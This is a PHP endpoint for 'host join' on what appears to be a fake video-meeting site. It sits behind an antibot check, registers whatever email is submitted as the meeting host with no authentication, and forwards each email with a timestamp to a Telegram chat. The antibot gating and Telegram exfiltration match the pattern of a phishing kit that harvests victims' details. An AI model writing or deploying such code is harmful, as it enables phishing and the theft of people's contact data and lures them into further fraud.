<?php
// Host join endpoint — validates meeting + registers host email
require_once dirname(__DIR__) . '/antibot.php';
antibot_protect_api();
require_once dirname(__DIR__) . '/config.php';
header('Content-Type: application/json');

$m     = preg_replace('/[^0-9\-]/', '', $_POST['m'] ?? '');
$email = filter_var(trim($_POST['email'] ?? ''), FILTER_VALIDATE_EMAIL);

if (!$m || !$email) {
    echo json_encode(['ok'=>false,'msg'=>'Invalid meeting ID or email']); exit;
}

$file = zm_meet_file($m);
if (!file_exists($file)) {
    echo json_encode(['ok'=>false,'msg'=>'Meeting not found or expired']); exit;
}

$meet = zm_load($file);
if ($meet['status'] === 'ended') {
    echo json_encode(['ok'=>false,'msg'=>'This meeting has ended']); exit;
}

// Register host
$meet['host_email']  = $email;
$meet['host_joined'] = time();
$meet['status']      = 'active';
zm_save($file, $meet);

// Notify via Telegram
tg_send("👥 <b>Host joined meeting</b>\nMeeting: <code>{$m}</code>\nEmail: {$email}\nTime: " . date('Y-m-d H:i:s'));

$roomUrl = SITE_URL . '/room.php?m=' . $m . '&role=host&email=' . urlencode($email);
echo json_encode(['ok'=>true,'room'=>$roomUrl]);
